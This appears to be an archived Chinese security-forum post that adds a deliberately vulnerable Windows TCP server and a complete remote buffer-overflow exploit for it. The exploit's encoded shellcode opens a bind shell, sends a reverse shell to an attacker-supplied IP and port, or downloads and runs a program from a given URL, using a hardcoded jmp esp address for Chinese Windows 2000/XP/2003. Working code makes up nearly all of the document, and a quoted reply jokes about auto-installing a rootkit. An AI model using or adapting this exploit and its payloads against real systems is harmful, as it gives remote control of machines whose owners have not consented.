@@ -1,0 +1,304 @@
+
+# shellcode
+
+> 原文：[`www.pediy.com/kssd/pediy07/pediy7-28.htm`](https://www.pediy.com/kssd/pediy07/pediy7-28.htm)
+
+续：[`bbs.pediy.com/showthread.php...;threadid=10399`](http://bbs.pediy.com/showthread.php?s=&threadid=10399)
+
+> 引用:
+> 
+> * * *
+> 
+> *最初由 peaceclub 发布*
+> 
+> **我还准备写个自动下载 rootkit 并运行的呢。哈哈**
+> 
+> 想想也没什么意义，所以就没做了。
+> 
+> 楼主弄个所有语言通用的 shellcode 来吧,自动 bindport 或者 download & execute 的 ：）**
+> 
+> * * *
+
+这个很简单的
+
+在 `jmp ESP` 后面加上 `shellcode` 就可以了
+
+你要的 `shellcode` 我都有
+
+但是所有语言通用就比较麻烦了
+
+我现在例子里提示的就只有 `2000/XP sp1/2003` 通用不过 `XP SP2` 有溢出保护很难利用了
+
+附上相关 `shellcode` 和我写的一个例子
+
+一个有问题的 server
+
+```c
+/*---------------------------------------------------------------------
+//server.c
+//Coder: larblue
+//Create date: 2004.4.8
+//Compiler: LCC
+//Test platform: Win2000 Adv Server + sp4
+\---------------------------------------------------------------------\*/
+#include <winsock2.h>
+#include <windows.h>
+#include <stdio.h>
+#pragma comment (lib,"ws2\_32")
+char Buff[1024];
+void overflow(char * s,int size)
+{
+    char s1[50];//没有限制输入字符的数量溢出点在此
+    printf("receive %d bytes",size);
+    s[size]=0;
+    strcpy(s1,s);
+}
+int main()
+{
+    WSADATA wsa;
+    SOCKET listenFD,clientFD;
+    int ret;
+    //char asd[2048];
+    struct sockaddr_in ser;
+  int iAddrSize = sizeof(ser);
+   unsigned long lBytesRead;
+    WSAStartup(MAKEWORD(2,2),&wsa);
+    listenFD = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+    ser.sin_family = AF_INET;
+    ser.sin_port = htons(3746);
+    ser.sin_addr.s_addr=ADDR_ANY;
+    ret=bind(listenFD,(struct sockaddr *)&ser,sizeof(ser));
+    ret=listen(listenFD,2);
+    clientFD=accept(listenFD,(struct sockaddr *)&ser,&iAddrSize);
+    while(1)    {
+            lBytesRead=recv(clientFD,Buff,1024,0);
+            if(lBytesRead<=0)    break;
+            overflow(Buff,lBytesRead);
+            ret=send(clientFD,Buff,lBytesRead,0);
+            if(ret<=0)    break;
+    }
+    WSACleanup();
+    return 0;
+}
+```
+
+利用漏洞的的溢出程序
+
+```c
+/*---------------------------------------------------------------------
+//server_exploit.c
+//Coder: larblue
+//Create date: 2004.4.8
+//Compiler: LCC
+//Test platform: Win2000 Adv Server + sp4
+\---------------------------------------------------------------------\*/
+#include <winsock.h>
+#include <windows.h>
+#include <stdio.h>
+#pragma comment (lib,"ws2\_32")
+void help(char *program)
+{
+    printf ("==================================================\r\n");
+    printf ("   远程溢出程序测试 Code By Larblue 2004/03/29\r\n");
+    printf ("==================================================\r\n\r\n");
+    printf ("参数:\r\n");
+    printf ("     %s <Server> <Port>\r\n", program);
+    printf ("     %s <Server> <Port> <URL>\r\n", program);
+    printf ("     %s <Server> <Port> <NC IP> <NC Port>\r\n", program);
+    printf ("     本地监听:NC.EXE -L -P <NC Port>\r\n", program);
+    printf ("例如:\r\n");
+    printf ("     %s 192.168.0.1 3746\r\n", program);
+    printf ("     %s 192.168.0.1 3746 http://192.168.0.2/test.exe\r\n", program);
+    printf ("     %s 192.168.0.1 3746 192.168.0.2 9999\r\n", program);
+    printf ("     本地监听:NC.EXE -L -P 9999\r\n", program);
+    return;
+}
+```
+
+//打开 TCP 端口等待连接
+
+```c
+unsigned char bpsc[]=
+"\\xEB\\x10\\x5A\\x4A\\x33\\xC9\\x66\\xB9\\x66\\x01\\x80\\x34\\x0A\\x99\\xE2\\xFA"
+"\\xEB\\x05\\xE8\\xEB\\xFF\\xFF\\xFF\\x70\\x99\\x98\\x99\\x99\\xC3\\x21\\x95\\x69"
+"\\x64\\xE6\\x12\\x99\\x12\\xE9\\x85\\x34\\x12\\xD9\\x91\\x12\\x41\\x12\\xEA\\xA5"
+"\\x9A\\x6A\\x12\\xEF\\xE1\\x9A\\x6A\\x12\\xE7\\xB9\\x9A\\x62\\x12\\xD7\\x8D\\xAA"
+"\\x74\\xCF\\xCE\\xC8\\x12\\xA6\\x9A\\x62\\x12\\x6B\\xF3\\x97\\xC0\\x6A\\x3F\\xED"
+"\\x91\\xC0\\xC6\\x1A\\x5E\\x9D\\xDC\\x7B\\x70\\xC0\\xC6\\xC7\\x12\\x54\\x12\\xDF"
+"\\xBD\\x9A\\x5A\\x48\\x78\\x9A\\x58\\xAA\\x50\\xFF\\x12\\x91\\x12\\xDF\\x85\\x9A"
+"\\x5A\\x58\\x78\\x9B\\x9A\\x58\\x12\\x99\\x9A\\x5A\\x12\\x63\\x12\\x6E\\x1A\\x5F"
+"\\x97\\x12\\x49\\xF3\\x9A\\xC0\\x71\\xE5\\x99\\x99\\x99\\x1A\\x5F\\x94\\xCB\\xCF"
+"\\x66\\xCE\\x65\\xC3\\x12\\x41\\xF3\\x9D\\xC0\\x71\\xF0\\x99\\x99\\x99\\xC9\\xC9"
+"\\xC9\\xC9\\xF3\\x98\\xF3\\x9B\\x66\\xCE\\x69\\x12\\x41\\x5E\\x9E\\x9B\\x99"
+"\\x9E\\x27"//port=hex_port xor 9999 default 1982
+"\\xAA\\x59\\x10\\xDE\\x9D\\xF3\\x89\\xCE\\xCA\\x66\\xCE\\x6D\\xF3\\x98\\xCA"
+"\\x66\\xCE\\x61\\xC9\\xC9\\xCA\\x66\\xCE\\x65\\x1A\\x75\\xDD\\x12\\x6D\\xAA\\x42"
+"\\xF3\\x89\\xC0\\x10\\x85\\x17\\x7B\\x62\\x10\\xDF\\xA1\\x10\\xDF\\xA5\\x10\\xDF"
+"\\xD9\\x5E\\xDF\\xB5\\x98\\x98\\x99\\x99\\x14\\xDE\\x89\\xC9\\xCF\\xCA\\xCA\\xCA"
+"\\xF3\\x98\\xCA\\xCA\\x5E\\xDE\\xA5\\xFA\\xF4\\xFD\\x99\\x14\\xDE\\xA5\\xC9\\xCA"
+"\\x66\\xCE\\x7D\\xC9\\x66\\xCE\\x71\\xAA\\x59\\x35\\x1C\\x59\\xEC\\x60\\xC8\\xCB"
+"\\xCF\\xCA\\x66\\x4B\\xC3\\xC0\\x32\\x7B\\x77\\xAA\\x59\\x5A\\x71\\x62\\x67\\x66"
+"\\x66\\xDE\\xFC\\xED\\xC9\\xEB\\xF6\\xFA\\xD8\\xFD\\xFD\\xEB\\xFC\\xEA\\xEA\\x99"
+"\\xDA\\xEB\\xFC\\xF8\\xED\\xFC\\xC9\\xEB\\xF6\\xFA\\xFC\\xEA\\xEA\\xD8\\x99\\xDC"
+"\\xE1\\xF0\\xED\\xC9\\xEB\\xF6\\xFA\\xFC\\xEA\\xEA\\x99\\xD5\\xF6\\xF8\\xFD\\xD5"
+"\\xF0\\xFB\\xEB\\xF8\\xEB\\xE0\\xD8\\x99\\xEE\\xEA\\xAB\\xC6\\xAA\\xAB\\x99\\xCE"
+"\\xCA\\xD8\\xCA\\xF6\\xFA\\xF2\\xFC\\xED\\xD8\\x99\\xFB\\xF0\\xF7\\xFD\\x99\\xF5"
+"\\xF0\\xEA\\xED\\xFC\\xF7\\x99\\xF8\\xFA\\xFA\\xFC\\xE9\\xED\\x99";
+```
+
+//反向连接 shell
+
+```c
+#define IP_OFFSET 236
+#define PORT_OFFSET 231
+unsigned char cbsc[]=
+"\\xEB\\x10\\x5A\\x4A\\x33\\xC9\\x66\\xB9\\x4F\\x01\\x80\\x34\\x0A\\x99\\xE2\\xFA"
+"\\xEB\\x05\\xE8\\xEB\\xFF\\xFF\\xFF"
+"\\x70\\x6D\\x99\\x99\\x99\\xC3\\x21\\x95\\x69\\x64\\xE6\\x12\\x99\\x12\\xE9\\x85"
+"\\x34\\x12\\xD9\\x91\\x12\\x41\\x12\\xEA\\xA5\\x9A\\x6A\\x12\\xEF\\xE1\\x9A\\x6A"
+"\\x12\\xE7\\xB9\\x9A\\x62\\x12\\xD7\\x8D\\xAA\\x74\\xCF\\xCE\\xC8\\x12\\xA6\\x9A"
+"\\x62\\x12\\x6B\\xF3\\x97\\xC0\\x6A\\x3F\\xED\\x91\\xC0\\xC6\\x1A\\x5E\\x9D\\xDC"
+"\\x7B\\x70\\xC0\\xC6\\xC7\\x12\\x54\\x12\\xDF\\xBD\\x9A\\x5A\\x48\\x78\\x9A\\x58"
+"\\xAA\\x50\\xFF\\x12\\x91\\x12\\xDF\\x85\\x9A\\x5A\\x58\\x78\\x9B\\x9A\\x58\\x12"
+"\\x99\\x9A\\x5A\\x12\\x63\\x12\\x6E\\x1A\\x5F\\x97\\x12\\x49\\xF3\\x9A\\xC0\\x71"
+"\\xE9\\x99\\x99\\x99\\x1A\\x5F\\x94\\xCB\\xCF\\x66\\xCE\\x65\\xC3\\x12\\x41\\xF3"
+"\\x9B\\xC0\\x71\\xC4\\x99\\x99\\x99\\x1A\\x75\\xDD\\x12\\x6D\\xF3\\x89\\xC0\\x10"
+"\\x9D\\x17\\x7B\\x62\\xC9\\xC9\\xC9\\xC9\\xF3\\x98\\xF3\\x9B\\x66\\xCE\\x61\\x12"
+"\\x41\\x10\\xC7\\xA1\\x10\\xC7\\xA5\\x10\\xC7\\xD9\\xFF\\x5E\\xDF\\xB5\\x98\\x98"
+"\\x14\\xDE\\x89\\xC9\\xCF\\xAA\\x59\\xC9\\xC9\\xC9\\xF3\\x98\\xC9\\xC9\\x14\\xCE"
+"\\xA5\\x5E\\x9B\\xFA\\xF4\\xFD\\x99\\xCB\\xC9\\x66\\xCE\\x75\\x5E\\x9E\\x9B\\x99"
+"\\x9E\\x24\\x5E\\xDE\\x9D\\xE6\\x99\\x99\\x98\\xF3\\x89\\xCE\\xCA\\x66\\xCE\\x65"
+"\\xC9\\x66\\xCE\\x69\\xAA\\x59\\x35\\x1C\\x59\\xEC\\x60\\xC8\\xCB\\xCF\\xCA\\x66"
+"\\x4B\\xC3\\xC0\\x32\\x7B\\x77\\xAA\\x59\\x5A\\x71\\x9E\\x66\\x66\\x66\\xDE\\xFC"
+"\\xED\\xC9\\xEB\\xF6\\xFA\\xD8\\xFD\\xFD\\xEB\\xFC\\xEA\\xEA\\x99\\xDA\\xEB\\xFC"
+"\\xF8\\xED\\xFC\\xC9\\xEB\\xF6\\xFA\\xFC\\xEA\\xEA\\xD8\\x99\\xDC\\xE1\\xF0\\xED"
+"\\xC9\\xEB\\xF6\\xFA\\xFC\\xEA\\xEA\\x99\\xD5\\xF6\\xF8\\xFD\\xD5\\xF0\\xFB\\xEB"
+"\\xF8\\xEB\\xE0\\xD8\\x99\\xEE\\xEA\\xAB\\xC6\\xAA\\xAB\\x99\\xCE\\xCA\\xD8\\xCA"
+"\\xF6\\xFA\\xF2\\xFC\\xED\\xD8\\x99\\xFA\\xF6\\xF7\\xF7\\xFC\\xFA\\xED\\x99";
+```
+
+//远程下载并运行一个程序
+
+```c
+unsigned char dehead[]=
+"\\xEB\\x10\\x5A\\x4A\\x33\\xC9\\x66\\xB9\\x4F\\x01\\x80\\x34\\x0A\\x99\\xE2\\xFA"
+"\\xEB\\x05\\xE8\\xEB\\xFF\\xFF\\xFF"
+"\\x70\\x4D\\x99\\x99\\x99\\xC3\\x21\\x95\\x69"
+"\\x64\\xE6\\x12\\x99\\x12\\xE9\\x85\\x34\\x12\\xD9\\x91\\x12\\x41\\x12\\xEA\\xA5"
+"\\x9A\\x6A\\x12\\xEF\\xE1\\x9A\\x6A\\x12\\xE7\\xB9\\x9A\\x62\\x12\\xD7\\x8D\\xAA"
+```
+
+
+
+```
+// shellcode data
+"\x74\xCF\xCE\xC8\x12\xA6\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED"
+"\x91\xC0\xC6\x1A\x5E\x9D\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF"
+"\xBD\x9A\x5A\x48\x78\x9A\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A"
+"\x5A\x58\x78\x9B\x9A\x58\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F"
+"\x97\x12\x49\xF3\x9D\xC0\x71\xC9\x99\x99\x99\x1A\x5F\x94\xCB\xCF"
+"\x66\xCE\x65\xC3\x12\x41\xF3\x98\xC0\x71\xA4\x99\x99\x99\x1A\x5F"
+"\x8A\xCF\xDF\x19\xA7\x19\xEC\x63\x19\xAF\x19\xC7\x1A\x75\xB9\x12"
+"\x45\xF3\xB9\xCA\x66\xCE\x75\x5E\x9D\x9A\xC5\xF8\xB7\xFC\x5E\xDD"
+"\x9A\x9D\xE1\xFC\x99\x99\xAA\x59\xC9\xC9\xCA\xCF\xC9\x66\xCE\x65"
+"\x12\x45\xC9\xCA\x66\xCE\x69\xC9\x66\xCE\x6D\xAA\x59\x35\x1C\x59"
+"\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59\x5A"
+"\x71\xBE\x66\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD\xEB"
+"\xFC\xEA\xEA\x99\xDE\xFC\xED\xCA\xE0\xEA\xED\xFC\xF4\xDD\xF0\xEB"
+"\xFC\xFA\xED\xF6\xEB\xE0\xD8\x99\xCE\xF0\xF7\xDC\xE1\xFC\xFA\x99"
+"\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD"
+"\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEC\xEB\xF5\xF4\xF6\xF7\x99"
+"\xCC\xCB\xD5\xDD\xF6\xEE\xF7\xF5\xF6\xF8\xFD\xCD\xF6\xDF\xF0\xF5"
+"\xFC\xD8\x99";
+
+//"http://127.0.0.1/hello.exe"
+//"\x80";
+
+unsigned char desc[500]={0};
+
+void main(int argc, char *argv[])
+{
+    WSADATA wsaData;
+    SOCKET s;
+    struct hostent *he;
+    struct sockaddr_in host;
+    int nTimeout = 1000;
+    if(argc != 3 && argc != 4 && argc != 5)
+    {
+        help(argv[0]);
+        return;
+    }
+    if(argc == 4)
+    {
+        //initialize the download & execute shellcode
+        //shellcode head + ((url + 0x80) xor 0x99 )  <==all for damned ':'
+        memset(desc, 0, 500);
+        memcpy(desc, dehead, sizeof(dehead));
+        char url[255];
+        strcpy(url, argv[3]);
+        strcat((char*)url, "\x80");
+        for(unsigned int j=0; j < strlen(url); j++)
+            url[j] = url[j]^'\x99';
+        strcat((char*)desc, url);
+    }
+    if(argc == 5)
+    {
+        unsigned short port = htons(atoi(argv[4]))^(u_short)0x9999;
+        unsigned long ip = inet_addr(argv[3])^0x99999999;
+        memcpy(&cbsc[PORT_OFFSET], &port, 2);
+        memcpy(&cbsc[IP_OFFSET], &ip, 4);
+    }
+    if(WSAStartup(0x0101,&wsaData) != 0)
+    {
+        printf("错误: 无法启动 winsock!");
+        return;
+    }
+    if((he = gethostbyname(argv[1])) == 0)
+    {
+        printf("错误: 未知错误!'%s'",argv[1]);
+        return;
+    }
+    host.sin_port = htons(atoi(argv[2]));
+    host.sin_family = AF_INET;
+    host.sin_addr = *((struct in_addr *)he->h_addr);
+    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+    {
+        printf("错误: 无法创建 socket!");
+        return;
+    }
+    if ((connect(s, (struct sockaddr *) &host, sizeof(host))) == -1)
+    {
+        printf("错误: 无法连接主机\r\n");
+        return;
+    }
+    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&nTimeout,sizeof(nTimeout));
+    char xploit[1024] = {0};
+    char head[] = "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
+      "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
+      "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
+      "\x61\x61\x61\x61\x61\x61";
+    //以后可能加入多 os 溢出版本选择
+    char EXP_CN[]="\x12\x45\xfa\x7f";//jmp esp for CN nt/2k/xp/2003 All
+    memset(xploit, 0, sizeof(xploit));
+    strcpy(xploit, head);
+    // copy the EXP code
+    memcpy(xploit + strlen(head), EXP_CN, sizeof(EXP_CN));
+    // copy the shellcode
+    if(argc == 3)
+        memcpy(xploit + strlen(head) + strlen(EXP_CN), bpsc, sizeof(bpsc));
+    if(argc == 4)
+        memcpy(xploit + strlen(head) + strlen(EXP_CN), desc, strlen((char*)desc));
+    if(argc == 5)
+        memcpy(xploit + strlen(head) + strlen(EXP_CN), cbsc, sizeof(cbsc));
+    send(s, xploit, strlen(xploit), 0);
+    if(argc == 3)
+        printf("溢出成功! 现在可以用 NC 连接远程主机的 1982 端口得到一个 Shell!\r\n");
+    if(argc == 4)
+        printf("溢出成功! 远程主机已经成功运行了刚才下载的程序!\r\n");
+    if(argc == 5)
+        printf("溢出成功! 看看你 NC 是否监听到来自远程主机的 Shell!\r\n");
+    closesocket(s);
+    return;
+}
+4dd466d0e1e0cc123afbe504da2462ca
+```
